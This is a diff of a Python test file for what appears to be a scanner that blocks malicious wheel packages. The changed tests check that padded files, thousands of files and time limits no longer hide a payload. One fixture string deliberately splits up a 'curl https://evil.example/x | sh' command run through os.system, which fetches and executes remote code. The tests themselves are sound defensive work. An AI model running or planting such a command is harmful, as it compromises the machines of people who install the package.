@@ -184,22 +184,28 @@ class SourceEncodings(Base):
 
 
 class Limits(Base):
-    def test_over_the_size_limit(self):
+    """Padding a file or adding thousands of files no longer hides anything: there is no size or file-count limit,
+    the payload is read and blocked. Only the time limit is left, and what it leaves unread is a review."""
+    def test_padding_a_file(self):
         pad = "".join(f"# filler line {i} {'x' * 60}\n" for i in range(25000))       # ~1.9MB
-        v = self.review(wheel([("evilpkg/__init__.py", PAYLOAD + pad)]), "1.9MB __init__.py")
-        self.assertTrue(any("not analyzed" in r for r in v.reasons), v.reasons)
-        # the same file where only a function would run it (a command, not code that runs by itself): no review
+        self.block(wheel([("evilpkg/__init__.py", PAYLOAD + pad)]), "1.9MB __init__.py")
         self.allow(wheel([("evilpkg/__main__.py", "X = 1\n" + pad)]), "big __main__.py")
 
-    def test_too_many_files(self):
+    def test_many_files(self):
         split = "import os\nc = 'cu' + 'rl https://evil.example/x | s' + 'h'\nos.system(c)\n"
-        # import roots go first: the package `import zzz` runs is read before 3001 modules nothing imports
-        many = [(f"aaa/m{i}.py", "x = 1\n") for i in range(3001)]
-        self.block(wheel(many + [("zzz/__init__.py", split)]), "3001 files + payload in a package __init__")
-        # 3001 top-level modules: the import root left over at the limit is not read, which is a review
         many = [(f"m{i:04d}.py", "x = 1\n") for i in range(3001)]
-        v = self.review(wheel(many + [("zzz.py", split)]), "3001 top-level modules + payload last")
-        self.assertTrue(any("not analyzed" in r for r in v.reasons), v.reasons)
+        self.block(wheel(many + [("zzz.py", split)]), "3001 top-level modules + payload last")
+
+    def test_time_limit_is_a_review(self):
+        from behavior.values import policy
+        lim = policy().limits
+        keep = lim["seconds"]
+        lim["seconds"] = 0.0                                   # nothing can be read in time
+        try:
+            v = self.review(wheel([("evilpkg/__init__.py", "import os\nx = 1\n")]), "time limit reached")
+            self.assertTrue(any("not analyzed" in r for r in v.reasons), v.reasons)
+        finally:
+            lim["seconds"] = keep
 
 
 class InstallHandsWorkToFiles(Base):
